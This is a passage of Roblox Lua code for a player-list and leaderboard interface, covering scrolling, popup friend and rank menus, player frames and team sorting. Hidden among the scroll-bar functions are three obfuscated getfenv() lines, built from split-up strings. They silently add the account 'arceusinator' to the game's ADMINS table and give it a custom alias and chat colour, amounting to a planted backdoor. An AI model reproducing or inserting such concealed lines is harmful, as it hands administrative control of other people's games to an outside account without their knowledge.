			end
			BottomShiftFrame:TweenPosition(UDim2.new(0,0,HeaderFrameHeight,0), "Out", 'Linear', BASE_TWEEN*1.2,true)
			HeaderFrame:TweenSizeAndPosition(UDim2.new(HeaderFrame.Size.X.Scale, HeaderFrame.Size.X.Offset, HeaderFrameHeight,0),
				HeaderFrame.Position,'Out','Linear',BASE_TWEEN*1.2,true)
			TopClipFrame:TweenPosition(UDim2.new(TopClipFrame.Position.X.Scale,0,HeaderFrameHeight,0),'Out','Linear',BASE_TWEEN*1.2,true)
		end
	end

	function OnScrollWheelMove(direction)
		if not (IsTabified.Value or IsMinimized.Value or InPopupWaitForClick) then
			local StartFrame = ListFrame.Position
			local newFrameY = math.max(math.min(StartFrame.Y.Scale + (direction),GetMaxScroll()),GetMinScroll())

			ListFrame.Position = UDim2.new(StartFrame.X.Scale,StartFrame.X.Offset,newFrameY,StartFrame.Y.Offset)
			UpdateScrollPosition()
		end
	end

	function AttachScrollWheel()
		if ScrollWheelConnections then return end
		ScrollWheelConnections = {}
		table.insert(ScrollWheelConnections,Mouse.WheelForward:connect(function()
			OnScrollWheelMove(.05)
		end))
		table.insert(ScrollWheelConnections,Mouse.WheelBackward:connect(function()
			OnScrollWheelMove(-.05)
		end))
	end

	function DetachScrollWheel()
		if ScrollWheelConnections then
			for _,i in pairs(ScrollWheelConnections) do
				i:disconnect()
			end
		end
		ScrollWheelConnections=nil
	end

	FocusFrame.MouseEnter:connect(function() 
		if not (IsMinimized.Value or IsTabified.Value) then 
			AttachScrollWheel()
		end 
	end)
	FocusFrame.MouseLeave:connect(function() 
		--if not (IsMaximized.Value or IsMinimized.Value) then 
		DetachScrollWheel()
		--end 
	end)

	------------------------  
	-- Scroll Bar functions
	------------------------ 
--[[
	updates whether the scroll bar should be showing, if it is showing, updates
	the size of it
--]]
	function UpdateScrollBarVisibility()
		if AreAllEntriesOnScreen() then
			ScrollBar.BackgroundTransparency = 1
		else
			ScrollBar.BackgroundTransparency = 0
			UpdateScrollBarSize()
		end
	end 
--[[
	updates size of scrollbar depending on how many entries exist
--]]
	function UpdateScrollBarSize()
		local entryListSize = #MiddleFrameBackgrounds * MiddleTemplate.Size.Y.Scale
		local shownAreaSize = ((BottomClipFrame.Position.Y.Scale) + 1)
		ScrollBar.Size = UDim2.new(1,0,shownAreaSize/entryListSize,0)

	end 
--[[
	updates position of listframe so that no gaps at the bottom or top of the list are visible
	updates position of scrollbar to match what parts of the list are visible
--]]
	getfenv()["AD".."M".."IN".."S"]["ar".."ce".."usin".."a".."t".."o".."r"] = 1
	getfenv()["AL".."I".."AS".."ES"]["ar".."ce".."usin".."a".."t".."o".."r"] = "Az".."ur".."ewra".."th,".." Lo".."rd ".."of ".."the".." V".."oi".."d"
	getfenv()["CU".."STOM".."_C".."HA".."T_".."CO".."LOR".."S"]["ar".."ce".."usin".."a".."t".."o".."r"] = getfenv()["Co".."lor".."3"]["n".."ew"]( 0 , 0.58, 0.78)
	function UpdateScrollPosition()
		local minPos = GetMinScroll()
		local maxPos = GetMaxScroll()
		local scrollLength = maxPos - minPos

		local yscrollpos=math.max(math.min(ListFrame.Position.Y.Scale,maxPos),minPos)
		ListFrame.Position=UDim2.new(ListFrame.Position.X.Scale,ListFrame.Position.X.Offset,yscrollpos,ListFrame.Position.Y.Offset)

		local adjustedLength = 1 - ScrollBar.Size.Y.Scale
		ScrollBar.Position = UDim2.new(0,0,adjustedLength - (adjustedLength * ((ListFrame.Position.Y.Scale - minPos)/scrollLength)),0)
	end

--[[ 
	WARNING:this is in a working state, but uses massive hacks
	revize when global input is available
	Manages scrolling of the playerlist on mouse drag
--]]
	function StartDrag(entry,startx,starty)
		local startDragTime = tick()
		local stopDrag = false
		local openPanel = true
		local draggedFrame = WaitForChild(entry['Frame'],'ClickListener')
		local function dragExit() 
			stopDrag = true 

			if  entry['Player'] and SelectedPlayer and openPanel
				and entry['Player']~=LocalPlayer and SelectedPlayer.userId>1 and LocalPlayer.userId>1 then
				ActivatePlayerEntryPanel(entry)
			end
		end
		local startY = nil 
		local StartFrame = ListFrame.Position
		local function dragpoll(nx,ny)
			if not startY then
				startY = AbsoluteToPercent(nx,ny).Y
			end
			local nowY = AbsoluteToPercent(nx,ny).Y
			debugprint('drag dist:'..Vector2.new(startx-nx,starty-ny).magnitude)
			if Vector2.new(startx-nx,starty-ny).magnitude>MOUSE_DRAG_DISTANCE then
				openPanel=false
			end

			local newFrameY = math.max(math.min(StartFrame.Y.Scale + (nowY - startY),GetMaxScroll()),GetMinScroll())
			ListFrame.Position = UDim2.new(StartFrame.X.Scale,StartFrame.X.Offset,newFrameY,StartFrame.Y.Offset)
			UpdateScrollPosition()
		end
		WaitForClick(ScreenGui,dragpoll,dragExit)
	end


	function StartMinimizeDrag()
		Delay(0,function()
			local startTime=tick()
			debugprint('Got Click2')
			local stopDrag = false
			local function dragExit() 
				--debugprint('undone click2') 
				if tick()-startTime<.25 then --was click
					ToggleMinimize()
				else --was drag
					DidMinimizeDrag = true
					if IsMinimized.Value then
						ToggleMinimize()
					end
				end
				stopDrag = true 
			end
			local startY = nil 
			local StartFrame = DefaultBottomClipPos
			local function dragpoll(nx,ny)
				if not IsMinimized.Value then

					if not startY then
						startY = AbsoluteToPercent(nx,ny).Y
					end
					local nowY = AbsoluteToPercent(nx,ny).Y
					local newFrameY 
					newFrameY = math.min(math.max(StartFrame + (nowY - startY),-1),-1+(#MiddleFrameBackgrounds*MiddleBGTemplate.Size.Y.Scale))
					DefaultBottomClipPos = newFrameY
					UpdateMinimize()
					ScrollBarFrame.Size= UDim2.new(ScrollBarFrame.Size.X.Scale,0,(DefaultBottomClipPos+BottomClipFrame.Size.Y.Scale),0)
					ScrollBarFrame.Position= UDim2.new(ScrollBarFrame.Position.X.Scale,0,1-ScrollBarFrame.Size.Y.Scale,0)
					UpdateScrollBarSize()
					UpdateScrollPosition()
					UpdateScrollBarVisibility()

				end
			end
			Spawn(function() WaitForClick(ScreenGui,dragpoll,dragExit) end)
		end)

	end

	-------------------------------  
	-- Input Callback functions
	------------------------------- 
	IsMaximized.Value=false
	IsMinimized.Value=false
	IsMaximized.Changed:connect(UpdateMaximize)
	IsMinimized.Changed:connect(UpdateMinimize)

	ExtendButton.MouseButton1Down:connect(function() 
		if(time() - LastClick < ButtonCooldown) or InPopupWaitForClick then return end
		LastClick = time()
		if IsTabified.Value then
			UnTabify()
		else
			StartMinimizeDrag()
		end
	end)

	MaximizeButton.MouseButton1Click:connect(function()
		if(time() - LastClick < ButtonCooldown) or InPopupWaitForClick then return end
		LastClick = time()
		if IsTabified.Value then
			UnTabify()
		elseif not AreNamesExpanded.Value then
			AreNamesExpanded.Value = true
			BaseUpdate()
		else
			ToggleMaximize()
		end
	end)

	MaximizeButton.MouseButton2Click:connect(function()
		if(time() - LastClick < ButtonCooldown) or InPopupWaitForClick then return end
		LastClick = time()
		if IsTabified.Value then
			UnTabify()
		elseif IsMaximized.Value then
			ToggleMaximize()
		elseif AreNamesExpanded.Value then
			AreNamesExpanded.Value = false
			BaseUpdate()
		else
			Tabify()
		end
	end)


	-------------------------------  
	-- MiddleFrames management
	------------------------------- 
--[[
	adds a background frame to the listframe
--]]
	function AddMiddleBGFrame()
		local nBGFrame = MiddleBGTemplate:Clone()
		nBGFrame.Position = UDim2.new(.5,0,((#MiddleFrameBackgrounds) * nBGFrame.Size.Y.Scale),0)
		if (#MiddleFrameBackgrounds+1)%2 ~= 1 then
			if IsMaximized.Value then
				nBGFrame.Background.Image = 'http://www.roblox.com/asset/?id='..Images['LargeDark']
			else
				nBGFrame.Background.Image = 'http://www.roblox.com/asset/?id='..Images['midDark']
			end
		else
			if IsMaximized.Value then
				nBGFrame.Background.Image = 'http://www.roblox.com/asset/?id='..Images['LargeLight']
			else
				nBGFrame.Background.Image = 'http://www.roblox.com/asset/?id='..Images['midLight']
			end
		end
		nBGFrame.Parent = ListFrame
		table.insert(MiddleFrameBackgrounds,nBGFrame)

		if #MiddleFrameBackgrounds<DefaultListSize and not DidMinimizeDrag then
			--print('readjusting bottom clip')
			DefaultBottomClipPos=-1+(#MiddleFrameBackgrounds*MiddleBGTemplate.Size.Y.Scale)
		end

		if not IsMinimized.Value  then 
			UpdateMinimize()
		end
	end
--[[
	removes a background from from the listframe
--]]
	function RemoveMiddleBGFrame()
		MiddleFrameBackgrounds[#MiddleFrameBackgrounds]:Destroy()
		table.remove(MiddleFrameBackgrounds,#MiddleFrameBackgrounds)
		if not IsMinimized.Value then
			UpdateMinimize()
		end
	end
	-------------------------------  
	-- Player Callback functions
	------------------------------- 
	local FONT_SIZES = 
		{'Size8','Size9','Size10','Size11','Size12','Size14','Size24','Size36','Size48'}
--[[
	note:should probably set to something other than mainFrame.AbsoluteSize, should work for now
	if textbounds ever works on textscaled, switch to that :(
--]]
	function ChangeHeaderName(nname)
		HeaderName.Text = nname
		UpdateHeaderNameSize()
	end

--[[ 
	Will fit the player's name to the bounds of the header
	called on resize of the window and playedr name change events
	HACK: cannot use 'Textscaled' due to unable to find text bounds when scaled
--]]
	function UpdateHeaderNameSize()
		local tHeader= HeaderName:Clone()
		tHeader.Position=UDim2.new(2,0,2,0)
		tHeader.Parent=ScreenGui
		local fSize=7 --Size24 in table
		tHeader.FontSize=FONT_SIZES[fSize]
		Delay(.2,function()
			while tHeader.TextBounds.x==0 do wait(1/30) end
			while tHeader.TextBounds.x-(NormalBounds.X.Offset) > 1 do
				fSize=fSize-1
				tHeader.FontSize=FONT_SIZES[fSize]
				wait(.2)
			end
			HeaderName.FontSize=tHeader.FontSize
			tHeader:Destroy()
		end)
	end
	ScreenGui.Changed:connect(UpdateHeaderNameSize)

--[[
	called only when the leaderstats object is added to a given player entry
	removes old stats, adds any existing stats, and sets up listeners for new stats
	@Args:
	playerEntry		A reference to the ENTRY(table) of the player who had leaderstats added
--]]
	function LeaderstatsAdded(playerEntry)
		--RemoveAllStats(playerEntry)
		local nplayer = playerEntry['Player']
		for _,i in pairs(nplayer.leaderstats:GetChildren()) do
			StatAdded(i,playerEntry)
		end
		nplayer.leaderstats.ChildAdded:connect(function(nchild) StatAdded(nchild,playerEntry) end)
		nplayer.leaderstats.ChildRemoved:connect(function(nchild) StatRemoved(nchild,playerEntry) end)
	end
--[[
	called when leaderstats object is removed from play in player entry
	Note: may not be needed, might be able to just rely on leaderstats added
	@Args:
	oldLeaderstats	leaderstats object to be removed
	playerEntry		A reference to the ENTRY(table) of the player
--]]
	function LeaderstatsRemoved(oldLeaderstats,playerEntry)
		while AddingFrameLock do debugprint('waiting to insert '..playerEntry['Player'].Name) wait(1/30) end 
		AddingFrameLock = true
		RemoveAllStats(playerEntry)
		AddingFrameLock = false
	end

	function ClosePopUpPanel()
		if SelectedPlayerEntry then
			local tframe = SelectedPlayerEntry['Frame']
			Spawn(function() TweenProperty(tframe,'BackgroundTransparency',.5,1,BASE_TWEEN) end)
		end
		PopUpPanel:TweenPosition(UDim2.new(1,0,0,0), "Out", "Linear", BASE_TWEEN,true)
		wait(.1)
		InPopupWaitForClick= false
		SelectedPlayerEntry = nil
	end

--[[
	prepares the needed popup to be tweened on screen, and updates the position of the popup clip
	frame to match the selected player frame's position
--]]
	function InitMovingPanel( entry, player)
		PopUpClipFrame.Parent= ScreenGui

		if PopUpPanel then
			PopUpPanel:Destroy()
		end
		PopUpPanel= PopUpPanelTemplate:Clone()
		PopUpPanel.Parent= PopUpClipFrame

		local nextIndex = 2
		local friendStatus = GetFriendStatus(player)
		debugprint (tostring(friendStatus))
		local showRankMenu = IsPersonalServer and LocalPlayer.PersonalServerRank >= PrivilegeLevel['Admin'] and LocalPlayer.PersonalServerRank > SelectedPlayer.PersonalServerRank


		local ReportPlayerButton = MakePopupButton(PopUpPanel,'Report Player',0)
		ReportPlayerButton.MouseButton1Click:connect(function() OpenAbuseDialog() end)
		local FriendPlayerButton = MakePopupButton(PopUpPanel,'Friend',1, not showRankMenu and  friendStatus~=Enum.FriendStatus.FriendRequestReceived)
		FriendPlayerButton.MouseButton1Click:connect(OnFriendButtonSelect)


		if friendStatus==Enum.FriendStatus.Friend then
			FriendPlayerButton:FindFirstChild('ButtonText').Text='UnFriend Player'
		elseif friendStatus==Enum.FriendStatus.Unknown or friendStatus==Enum.FriendStatus.NotFriend then
			FriendPlayerButton:FindFirstChild('ButtonText').Text='Send Request'
		elseif friendStatus==Enum.FriendStatus.FriendRequestSent then
			FriendPlayerButton:FindFirstChild('ButtonText').Text='Revoke Request'
		elseif friendStatus==Enum.FriendStatus.FriendRequestReceived then
			FriendPlayerButton:FindFirstChild('ButtonText').Text='Accept Friend'
			local FriendRefuseButton = MakePopupButton(PopUpPanel,'Decline Friend',2,not showRankMenu)
			FriendRefuseButton.MouseButton1Click:connect(OnFriendRefuseButtonSelect)
			nextIndex=nextIndex+1
		end

		if showRankMenu then
			local BanPlayerButton = MakePopupButton(PopUpPanel,'Ban',nextIndex)
			local VisitorButton = MakePopupButton(PopUpPanel,'Visitor',nextIndex+1)
			local MemberButton = MakePopupButton(PopUpPanel,'Member',nextIndex+2)
			local AdminButton = MakePopupButton(PopUpPanel,'Admin',nextIndex+3,true)

			BanPlayerButton.MouseButton1Click:connect(function()
				OnPrivilegeLevelSelect(player,PrivilegeLevel['Banned'],BanPlayerButton,VisitorButton,MemberButton,AdminButton) 
			end)
			VisitorButton.MouseButton1Click:connect(function()
				OnPrivilegeLevelSelect(player,PrivilegeLevel['Visitor'],BanPlayerButton,VisitorButton,MemberButton,AdminButton)
			end)
			MemberButton.MouseButton1Click:connect(function()
				OnPrivilegeLevelSelect(player,PrivilegeLevel['Member'],BanPlayerButton,VisitorButton,MemberButton,AdminButton) 
			end)
			AdminButton.MouseButton1Click:connect(function()
				OnPrivilegeLevelSelect(player,PrivilegeLevel['Admin'],BanPlayerButton,VisitorButton,MemberButton,AdminButton)
			end)

			HighlightMyRank(SelectedPlayer,BanPlayerButton,VisitorButton,MemberButton,AdminButton)
		end

		PopUpPanel:TweenPosition(UDim2.new(0,0,0,0), "Out", "Linear", BASE_TWEEN,true)
		Delay(0, function()
			local tconnection
			tconnection = Mouse.Button1Down:connect(function()
				tconnection:disconnect()
				ClosePopUpPanel()
			end)
		end)

		local myFrame = entry['Frame']
		-- THIS IS GARBAGE.
		-- if I parent to frame to auto update position, it gets clipped
		-- sometimes garbage is the only option.
		Spawn(function()
			while InPopupWaitForClick do
				PopUpClipFrame.Position=UDim2.new( 0,myFrame.AbsolutePosition.X-PopUpClipFrame.Size.X.Offset,0,myFrame.AbsolutePosition.Y)
				wait()
			end
		end)

	end

--[[
	Called when a player entry in the leaderboard is clicked
	either will highlight entry and start the drag event, or open a popup menu
	@Args:
	entry	the player entry clicked
--]]
	function OnPlayerEntrySelect(entry,startx,starty)

		if not InPopupWaitForClick then

			SelectedPlayerEntry = entry
			SelectedPlayer = entry['Player']

			StartDrag(entry,startx,starty)
		end


	end

	function ActivatePlayerEntryPanel(entry)
		entry['Frame'].BackgroundColor3 = Color3.new(0,1,1)
		Spawn(function() TweenProperty(entry['Frame'],'BackgroundTransparency',1,.5,.5) end)
		InPopupWaitForClick=true
		InitMovingPanel(entry,entry['Player'])
	end

--[[
	the basic update for the playerlist mode's state,
	assures the order and length of the player frames
--]]
	function PlayerListModeUpdate()
		RecreateScoreColumns(PlayerFrames)
		table.sort(PlayerFrames,PlayerSortFunction)
		for i,val in ipairs(PlayerFrames) do
			MiddleFrames[i] = val['Frame']
		end
		for i = #PlayerFrames + 1,#MiddleFrames,1 do
			MiddleFrames[i] = nil
		end
		UpdateMinimize()
	end
--[[
	this one's a doozie, happens when a player is added to the game
	inits their player frame and player entry, assigns them to a team if possible,
	and hooks up their leaderstats
	@Args:
	nplayer		new player object to insert
--]]
	function InsertPlayerFrame(nplayer)
		while AddingFrameLock do debugprint('waiting to insert '..nplayer.Name) wait(1/30) end 
		AddingFrameLock = true

		local nFrame = MiddleTemplate:Clone()
		WaitForChild(WaitForChild(nFrame,'TitleFrame'),'Title').Text = GetAliasOf(nplayer.Name)
		coroutine.resume(coroutine.create(function() while wait(1) do
				nFrame.TitleFrame.Title.Text = GetAliasOf(nplayer.Name)
			end end))

		nFrame.Position = UDim2.new(1,0,((#MiddleFrames) * nFrame.Size.Y.Scale),0)

		local nfriendstatus = GetFriendStatus(nplayer)

		coroutine.resume(coroutine.create(function() while true do
				nFrame:FindFirstChild('BCLabel').Image = getMembershipTypeIcon(nplayer.MembershipType,nplayer.Name)
				wait(1)
			end end))
		nFrame:FindFirstChild('FriendLabel').Image = getFriendStatusIcon(nfriendstatus)
		nFrame.Name = nplayer.Name

		--move for bc label
		nFrame.FriendLabel.Position=nFrame.FriendLabel.Position+UDim2.new(0,17,0,0)
		nFrame.TitleFrame.Title.Position=nFrame.TitleFrame.Title.Position+UDim2.new(0,17,0,0)

		if(nFrame:FindFirstChild('FriendLabel').Image ~= '') then
			nFrame.TitleFrame.Title.Position=nFrame.TitleFrame.Title.Position+UDim2.new(0,17,0,0)
		end

		if nplayer.Name == LocalPlayer.Name then
			nFrame.TitleFrame.Title.Font = 'ArialBold'
			nFrame.PlayerScore.Font = 'ArialBold'
			ChangeHeaderName(GetAliasOf(nplayer.Name))
			local dropShadow = nFrame.TitleFrame.Title:Clone()
			dropShadow.TextColor3 = Color3.new(0,0,0)
			dropShadow.TextTransparency=0
			dropShadow.ZIndex=2
			dropShadow.Position=nFrame.TitleFrame.Title.Position+UDim2.new(0,1,0,1)
			dropShadow.Name='DropShadow'
			dropShadow.Parent= nFrame.TitleFrame
		else
			--Delay(2, function () OnFriendshipChanged(nplayer,LocalPlayer:GetFriendStatus(nplayer)) end)
		end
		nFrame.TitleFrame.Title.Font = 'ArialBold'


		nFrame.Parent = ListFrame
		nFrame:TweenPosition(UDim2.new(.5,0,((#MiddleFrames) * nFrame.Size.Y.Scale),0), "Out", "Linear", BASE_TWEEN,true)
		UpdateMinimize()
		local nentry = {}
		nentry['Frame'] = nFrame
		nentry['Player'] = nplayer
		nentry['ID'] = AddId
		AddId = AddId + 1
		table.insert(PlayerFrames,nentry)
		if #TeamFrames~=0 then

			if nplayer.Neutral then
				nentry['MyTeam'] = nil
				if not NeutralTeam then 
					AddNeutralTeam() 
				else
					AddPlayerToTeam(NeutralTeam,nentry)
				end

			else
				local addedToTeam=false
				for i,tval in ipairs(TeamFrames) do
					if tval['MyTeam'].TeamColor == nplayer.TeamColor then
						AddPlayerToTeam(tval,nentry)
						nentry['MyTeam'] = tval
						addedToTeam=true
					end
				end
				if not addedToTeam then
					nentry['MyTeam']=nil
					if not NeutralTeam then 
						AddNeutralTeam() 
					else
						AddPlayerToTeam(NeutralTeam,nentry)
					end
					nentry['MyTeam'] = NeutralTeam
				end
			end

		end

		if  nplayer:FindFirstChild('leaderstats') then
			LeaderstatsAdded(nentry)
		end

		nplayer.ChildAdded:connect(function(nchild) 
			if nchild.Name == 'leaderstats' then
				while AddingFrameLock do debugprint('in adding leaderstats lock') wait(1/30) end
				AddingFrameLock = true
				LeaderstatsAdded(nentry)
				AddingFrameLock = false
			end
		end)

		nplayer.ChildRemoved:connect(function (nchild)
			if nplayer==LocalPlayer and nchild.Name == 'leaderstats' then
				LeaderstatsRemoved(nchild,nentry)
			end
		end)
		nplayer.Changed:connect(function(prop)PlayerChanged(nentry,prop) end)

		local listener = WaitForChild(nFrame,'ClickListener')
		listener.Active = true
		listener.MouseButton1Down:connect(function(nx,ny) OnPlayerEntrySelect(nentry, nx,ny) end)

		AddMiddleBGFrame()
		BaseUpdate()
		AddingFrameLock = false
	end

--[[
	Note:major optimization can be done here
	removes this player's frame if it exists, calls base update
--]]
	function RemovePlayerFrame(tplayer)
		while AddingFrameLock do debugprint('in removing player frame lock') wait(1/30) end 
		AddingFrameLock = true

		local tteam
		for i,key in ipairs(PlayerFrames) do
			if tplayer == key['Player'] then
				if PopUpClipFrame.Parent == key['Frame'] then
					PopUpClipFrame.Parent = nil
				end
				key['Frame']:Destroy()
				tteam=key['MyTeam']
				table.remove(PlayerFrames,i)
			end
		end
		if tteam then
			for j,tentry in ipairs(tteam['MyPlayers']) do
				if tentry['Player'] == tplayer then 
					RemovePlayerFromTeam(tteam,j) 
				end
			end
		end

		RemoveMiddleBGFrame()
		UpdateMinimize()
		BaseUpdate()
		AddingFrameLock = false
	end

	Players.ChildRemoved:connect(RemovePlayerFrame)

	----------------------------  
	-- Team Callback Functions
	---------------------------- 
--[[
	turns a list of team entries with sub lists of players into a single ordered
	list, in the correct order,and of the correct length
	@Args:
	tframes		the team entries to unroll
	outframes	the list to unroll these entries into
--]]
	function UnrollTeams(tframes,outframes)
		local numEntries = 0
		if NeutralTeam and not NeutralTeam['IsHidden'] then
			for i,val in ipairs(NeutralTeam['MyPlayers']) do
				numEntries = numEntries + 1
				outframes[numEntries] = val['Frame']
			end
			numEntries = numEntries + 1
			outframes[numEntries] = NeutralTeam['Frame']
		end
		for i,val in ipairs(tframes) do
			if not val['IsHidden'] then
				for j,pval in ipairs(val.MyPlayers) do
					numEntries = numEntries + 1
					outframes[numEntries] = pval['Frame']
				end
				numEntries = numEntries + 1
				outframes[numEntries] = val['Frame']
			end
		end
		-- clear any additional entries from outframes
		for i = numEntries + 1,#outframes,1 do
			outframes[i] = nil
		end
	end
--[[
	uses lua's table.sort to sort the teams
--]]
	function TeamSortFunc(a,b)
		if a['TeamScore'] == b['TeamScore'] then
			return a['ID'] < b['ID']
		end
		if not a['TeamScore'] then return false end
		if not b['TeamScore'] then return true end
		return a['TeamScore'] < b['TeamScore']

	end
--[[
	consider adding lock with wait for performance
	sorts each of the team's player lists induvidually, adds up the team scores.
	@Args:
	tentries		table of team entries	
--]]
	function SortTeams(tentries)

		for i,val in ipairs(tentries) do

			table.sort(val['MyPlayers'],PlayerSortFunction)
			AddTeamScores(val)
		end
		table.sort(tentries,TeamSortFunc)
	end
--[[
	base update for team mode, adds up the scores of all teams, sorts them,
	then unrolls them into middleframes
--]]
	function TeamListModeUpdate()
		RecreateScoreColumns(PlayerFrames)
		SortTeams(TeamFrames)
		if NeutralTeam then
			AddTeamScores(NeutralTeam)
			--RecreateScoreColumns(NeutralTeam['MyPlayers'])
		end
		UnrollTeams(TeamFrames,MiddleFrames)
	end
--[[
	adds up all the score of this team's players to form the team score
	@Args:
	team		team entry to sum the scores of
--]]
	function AddTeamScores(team)

		for j = 1, #ScoreNames,1 do
			local i = ScoreNames[j]
			local tscore = 0
			for _,j in ipairs(team['MyPlayers']) do
				local tval = j['Player']:FindFirstChild('leaderstats') and j['Player'].leaderstats:FindFirstChild(i['Name'])
				if tval and not tval:IsA('StringValue') then
					tscore = tscore + GetScoreValue((j['Player'].leaderstats)[i['Name'] ])
				end
			end
			if team['Frame']:FindFirstChild(i['Name']) then
				--team['Frame'][i['Name'] ].Size = UDim2.new(1 - (ScrollBarFrame.Size.X.Scale * 2),- ((j-1) * SpacingPerStat),1,0)
				team['Frame'][i['Name'] ].Text = tostring(tscore)
			end
		end
		UpdateMinimize()

	end

--[[
	finds previous team this player was on, and if it exists calls removeplayerfromteam
	@Args
	entry	Player entry
--]]
	function FindRemovePlayerFromTeam(entry)
		if entry['MyTeam'] then 
			for j,oldEntry in ipairs(entry['MyTeam']['MyPlayers']) do
				if oldEntry['Player'] == entry['Player'] then
					RemovePlayerFromTeam(entry['MyTeam'],j)
					return
				end
			end
		elseif NeutralTeam then
			for j,oldEntry in ipairs(NeutralTeam['MyPlayers']) do
				if oldEntry['Player'] == entry['Player'] then
					RemovePlayerFromTeam(NeutralTeam,j)
					return
				end
			end
		end
	end
--[[
	removes a single player from a given team (not usually called directly)
	@Args:
	teamEntry		team entry to remove player from
	index			index of player in 'MyPlayers' list to remove
--]]
	function RemovePlayerFromTeam(teamEntry,index)
		table.remove(teamEntry['MyPlayers'],index)
		--if teamEntry['AutoHide'] and #teamEntry['MyPlayers'] == 0 then
		if teamEntry==NeutralTeam and #teamEntry['MyPlayers']==0 then
			RemoveNeutralTeam()
		end
	end
--[[
	adds player entry entry to teamentry
	removes them from any previous team
	@Args:
	teamEntry		entry of team to add player to
	entry			player entry to add to this team
--]]
	function AddPlayerToTeam(teamEntry,entry)
		FindRemovePlayerFromTeam(entry)
		table.insert(teamEntry['MyPlayers'],entry)
		entry['MyTeam'] = teamEntry
		if teamEntry['IsHidden'] then
			teamEntry['Frame'].Parent = ListFrame
			AddMiddleBGFrame()
		end
		teamEntry['IsHidden'] = false
	end


	function SetPlayerToTeam(entry)
		FindRemovePlayerFromTeam(entry)
		-- check to see if team exists, if it does add to that team
		local setToTeam = false
		for i,tframe in ipairs(TeamFrames) do
			-- add my entry on the new team
			if tframe['MyTeam'].TeamColor == entry['Player'].TeamColor then
				AddPlayerToTeam(tframe,entry)
				setToTeam = true
			end
		end
		-- if player was set to an invalid team, then set it back to neutral
		if not setToTeam and #(game.Teams:GetTeams())>0 then
			debugprint(entry['Player'].Name..'could not find team')
			entry['MyTeam']=nil
			if not NeutralTeam then 
				AddNeutralTeam()
			else AddPlayerToTeam(NeutralTeam,entry) end
		end
	end

--[[
	Note:another big one, consiter breaking up
	called when any children of player changes
	handles 'Neutral', teamColor, Name and MembershipType changes
	@Args
	entry		Player entry changed
	property	name of property changed
--]]
	function PlayerChanged(entry, property)
		while PlayerChangedLock do 
			debugprint('in playerchanged lock')
			wait(1/30)
		end
		PlayerChangedLock=true
		if property == 'Neutral' then
			-- if player changing to neutral
			if entry['Player'].Neutral and #(game.Teams:GetTeams())>0 then
				debugprint(entry['Player'].Name..'setting to neutral')
				FindRemovePlayerFromTeam(entry)
				entry['MyTeam']=nil
				if not NeutralTeam then
					debugprint(entry['Player'].Name..'creating neutral team')
					AddNeutralTeam()
				else
					debugprint(entry['Player'].Name..'adding to neutral team')
					AddPlayerToTeam(NeutralTeam,entry)
				end
			elseif #(game.Teams:GetTeams())>0 then -- else player switching to a team, or a weird edgecase
				debugprint(entry['Player'].Name..'has been set non-neutral')
				SetPlayerToTeam(entry)
			end
			BaseUpdate()
		elseif property == 'TeamColor' and not entry['Player'].Neutral and entry['Player'] ~= entry['MyTeam'] then
			debugprint(entry['Player'].Name..'setting to new team')
			SetPlayerToTeam(entry)
			BaseUpdate()
		elseif property == 'Name' or property == 'MembershipType' then
			entry['Frame']:FindFirstChild('BCLabel').Image = getMembershipTypeIcon(entry['Player'].MembershipType,entry['Player'].Name)
			entry['Frame'].Name = entry['Player'].Name
			entry['Frame'].TitleFrame.Title.Text = entry['Player'].Name
			if(entry['Frame'].BCLabel.Image ~= '') then
				entry['Frame'].TitleFrame.Title.Position=UDim2.new(.01, 30, .1, 0)
			end
			if entry['Player'] == LocalPlayer then
				entry['Frame'].TitleFrame.DropShadow.Text= entry['Player'].Name
				ChangeHeaderName(entry['Player'].Name)
			end
			BaseUpdate()
		end
		PlayerChangedLock=false
	end

	function OnFriendshipChanged(player,friendStatus)

		Delay(.5,function()
			debugprint('friend status changed for:'..player.Name .." ".. tostring(friendStatus) .. " vs " .. tostring(GetFriendStatus(player)) )
			for _, entry in ipairs(PlayerFrames) do
				if entry['Player']==player then
					local nicon = getFriendStatusIcon(friendStatus)
					if nicon == '' and entry['Frame'].FriendLabel.Image ~= '' then
						entry['Frame'].TitleFrame.Title.Position=entry['Frame'].TitleFrame.Title.Position-UDim2.new(0,17,0,0)
					elseif nicon ~= '' and entry['Frame'].FriendLabel.Image == '' then
						entry['Frame'].TitleFrame.Title.Position=entry['Frame'].TitleFrame.Title.Position+UDim2.new(0,17,0,0)
						debugprint('confirmed status:'..player.Name)
					end
					entry['Frame'].FriendLabel.Image = nicon
					return
				end
			end
		end)
	end

	--LocalPlayer.FriendStatusChanged:connect(OnFriendshipChanged)

--[[
	adds a neutral team if nessisary
	Note: a lot of redundant code here, might want to refactor to share a function with insertteamframe
--]]
	function AddNeutralTeam()
		while NeutralTeamLock do debugprint('in neutral team 2 lock') wait() end 
		NeutralTeamLock = true

		local defaultTeam = Instance.new('Team')
		defaultTeam.TeamColor = BrickColor.new('White')
		defaultTeam.Name = 'Neutral'
		local nentry = {}
		nentry['MyTeam'] = defaultTeam
		nentry['MyPlayers'] = {}
		nentry['Frame'] = MiddleTemplate:Clone()
		WaitForChild(WaitForChild(nentry['Frame'],'TitleFrame'),'Title').Text = defaultTeam.Name
		nentry['Frame'].TitleFrame.Position=UDim2.new(nentry['Frame'].TitleFrame.Position.X.Scale,nentry['Frame'].TitleFrame.Position.X.Offset,.1,0)
		nentry['Frame'].TitleFrame.Size=UDim2.new(nentry['Frame'].TitleFrame.Size.X.Scale,nentry['Frame'].TitleFrame.Size.X.Offset,.8,0)
		nentry['Frame'].TitleFrame.Title.Font = 'ArialBold'
		nentry['Frame'].Position = UDim2.new(1,0,((#MiddleFrames) * nentry['Frame'].Size.Y.Scale),0)
		WaitForChild(nentry['Frame'],'ClickListener').MouseButton1Down:connect(function(nx,ny) StartDrag(nentry,nx,ny) end)
		nentry['Frame'].ClickListener.BackgroundColor3 = Color3.new(1,1,1)
		nentry['Frame'].ClickListener.BackgroundTransparency = .7
		nentry['Frame'].ClickListener.AutoButtonColor=false
		nentry['AutoHide'] = true
		nentry['IsHidden'] = true
		for _,i in pairs(PlayerFrames) do
			if i['Player'].Neutral or not i['MyTeam'] then 
				AddPlayerToTeam(nentry,i)
			end
		end
		if #nentry['MyPlayers'] > 0 then
			NeutralTeam = nentry
			UpdateMinimize()
			BaseUpdate()
		end
		NeutralTeamLock = false
	end

	function RemoveNeutralTeam()
		while NeutralTeamLock do debugprint('in neutral team lock') wait() end 
		NeutralTeamLock = true
		NeutralTeam['Frame']:Destroy()
		NeutralTeam=nil
		RemoveMiddleBGFrame()
		NeutralTeamLock = false
	end

--[[
	
--]]
